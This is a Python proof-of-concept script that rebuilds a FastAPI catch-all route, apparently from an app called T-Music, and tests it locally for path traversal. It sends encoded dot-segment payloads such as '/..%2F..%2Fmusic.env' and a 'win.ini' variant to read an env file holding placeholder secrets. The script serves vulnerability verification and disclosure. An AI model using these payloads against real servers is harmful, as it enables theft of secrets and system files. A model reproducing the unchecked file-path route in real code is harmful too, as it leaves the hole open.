"""
PoC: Path Traversal in T-Music SPA catch-all route (app/main.py serve_spa).

Reproduces the EXACT routing logic of the production app:
    @app.get("/{full_path:path}")
    async def serve_spa(full_path: str):
        file_path = FRONTEND_DIST / full_path
        if file_path.is_file():
            return FileResponse(file_path)

An unauthenticated GET request with encoded dot-segments escapes frontend/dist
and reads arbitrary files (e.g. music.env with all secrets).
"""
import os
import sys
from pathlib import Path
from tempfile import mkdtemp

from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from fastapi.testclient import TestClient

# Build a directory layout mirroring the project: <root>/frontend/dist + <root>/music.env
ROOT = Path(mkdtemp(prefix="tmusic_poc_"))
DIST = ROOT / "frontend" / "dist"
DIST.mkdir(parents=True)
(ROOT / "music.env").write_text(
    "SECRET_KEY=poc_secret_key_value\n"
    "SESSION_SECRET=poc_session_secret\n"
    "ENCRYPTION_RECOVERY_KEY=poc_master_key\n"
    "DATABASE_URL=postgresql://user:password@localhost/db\n",
    encoding="utf-8",
)
(DIST / "index.html").write_text("<html>SPA</html>", encoding="utf-8")
(DIST / "assets").mkdir()
(DIST / "assets" / "app.js").write_text("console.log(1)", encoding="utf-8")

app = FastAPI()
app.mount("/assets", StaticFiles(directory=str(DIST / "assets")), name="assets")


@app.get("/{full_path:path}")
async def serve_spa(full_path: str):
    file_path = DIST / full_path
    if file_path.is_file():
        return FileResponse(file_path)
    return FileResponse(DIST / "index.html")


client = TestClient(app)

print("Test 1: normal SPA route")
r = client.get("/some/spa/route")
print("  ->", r.status_code, "(index.html served)" if r.status_code == 200 else "")
assert r.status_code == 200 and "SPA" in r.text

print("Test 2: encoded dot-segment traversal GET /..%2F..%2Fmusic.env")
r = client.get("/..%2F..%2Fmusic.env")
print("  ->", r.status_code)
if r.status_code == 200:
    print("  BODY:", r.text.replace("\n", " | "))
    assert "SECRET_KEY" in r.text, "secrets not exposed"
    print("  [VULNERABLE] Arbitrary file read: music.env with secrets is served unauthenticated")
else:
    print("  [NOT VULNERABLE on this starlette version]")

print("Test 3: variant GET /%2e%2e/%2e%2e/music.env")
r = client.get("/%2e%2e/%2e%2e/music.env")
print("  ->", r.status_code)
if r.status_code == 200 and "SECRET_KEY" in r.text:
    print("  [VULNERABLE] via %2e%2e variant as well")

print("Test 4: nested assets path traversal GET /assets/../../music.env (mounted StaticFiles)")
r = client.get("/assets/../../music.env")
print("  ->", r.status_code)

print("Test 5: try to escape to system file GET /..%2F..%2F..%2F..%2Fwindows%2Fwin.ini")
r = client.get("/..%2F..%2F..%2F..%2Fwindows%2Fwin.ini")
print("  ->", r.status_code)
if r.status_code == 200:
    print("  [VULNERABLE] Escape beyond project root confirmed")

import shutil
shutil.rmtree(ROOT, ignore_errors=True)
print("\nDone.")
